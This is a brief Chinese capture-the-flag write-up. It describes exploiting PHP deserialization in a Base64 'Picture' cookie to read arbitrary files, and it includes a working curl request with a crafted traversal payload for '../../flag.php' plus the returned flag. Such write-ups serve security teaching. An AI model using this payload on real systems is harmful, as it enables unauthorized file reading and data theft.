1. 访问 Picture 路由发现 Cookie 中有 Picture 字段，为 Base64 编码
2. 解码得到反序列化的数据，猜测存在反序列化漏洞，并且序列化的内容中有文件名，该文件会被读取出来编码为 Base64 展示在 HTML 中
3. 通过目录扫描得到存在 flag.php
4. 通过反序列化进行任意文件读取得到 flag.php 的内容

```
curl 'http://39.108.167.229/index.php/picture' -H 'Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=h002spfr0jl8d42a7rep0osmhb;' -vv
<?php $flag = "hxb2018{87f23af96f20d8cb284c578b4c08ad03}"; echo "flag{This_flag_iS_A_F4ke_flag}";
```
